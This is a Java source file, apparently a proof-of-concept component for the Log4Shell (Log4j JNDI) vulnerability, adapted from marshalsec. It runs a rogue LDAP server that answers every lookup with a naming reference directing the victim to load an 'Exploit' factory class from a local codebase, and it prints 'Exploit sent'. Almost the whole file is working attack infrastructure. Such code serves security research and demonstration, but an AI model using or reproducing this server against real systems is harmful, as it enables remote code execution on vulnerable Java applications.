package com.github.vjuranek.exploit;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetAddress;

/**
 * Based on Moritz Bechler's marshalsec
 * https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java
 */

public class Log4ShellLdap {

    private static final String LDAP_BASE = "dc=example,dc=com";
    private static final int LDAP_PORT = 1636;

    public static void main(String[] args) throws Exception {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listener",
                InetAddress.getByName("0.0.0.0"),
                LDAP_PORT,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new OperationInterceptor());
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("LDAP is running");
        ds.startListening();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry entry = new Entry(base);
            try {
                // See https://www.ietf.org/rfc/rfc2713.txt
                // also https://docs.oracle.com/javase/jndi/tutorial/objects/representation/ldap.html
                entry.addAttribute("javaClassName", Exploit.class.getName());
                // entry.addAttribute("javaSerializedData", serializeExploit());
                // entry.addAttribute("objectClass", "javaSerializedObject");
                //entry.addAttribute("javaCodebase", "http://127.0.0.1:8080/");
                entry.addAttribute("javaCodebase", "file:///tmp/");
                entry.addAttribute("objectClass", "javaNamingReference");
                entry.addAttribute("javaFactory", "com.github.vjuranek.exploit.Exploit");
                result.sendSearchEntry(entry);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
                System.out.println("Exploit sent");
            } catch (Exception e) {
                e.printStackTrace();
            }

        }
    }
}

